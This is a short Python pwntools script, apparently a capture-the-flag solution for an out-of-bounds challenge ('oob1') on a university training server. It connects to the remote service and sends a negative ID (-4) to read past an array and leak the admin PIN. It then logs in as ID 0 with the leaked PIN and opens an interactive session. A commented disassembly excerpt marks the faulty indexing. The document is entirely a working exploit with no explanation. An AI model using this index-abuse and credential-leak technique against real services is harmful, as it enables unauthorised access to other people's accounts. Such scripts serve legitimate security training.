from pwn import *

# r = process("./oob1")
r = remote('bamboofox.cs.nctu.edu.tw', 12011)

r.recvuntil('ID: ')

# leak admin PIN
"""
   0x400903 <main+175>:	cdqe   
   0x400905 <main+177>:	shl    rax,0x3
   0x400909 <main+181>:	add    rax,0x6010c0
=> 0x40090f <main+187>:	mov    rsi,rax
   0x400912 <main+190>:	mov    edi,0x400a58
   0x400917 <main+195>:	mov    eax,0x0
"""
r.sendline('-4')

r.recvuntil('PIN: ')

r.sendline('1234')

r.recvuntil('[')

pin = r.recv(4)

r.recvuntil('ID: ')

r.sendline('0')

r.recvuntil('PIN: ')

pin_code = u32(pin)

r.sendline(str(pin_code))

r.recv(4096)

r.interactive()
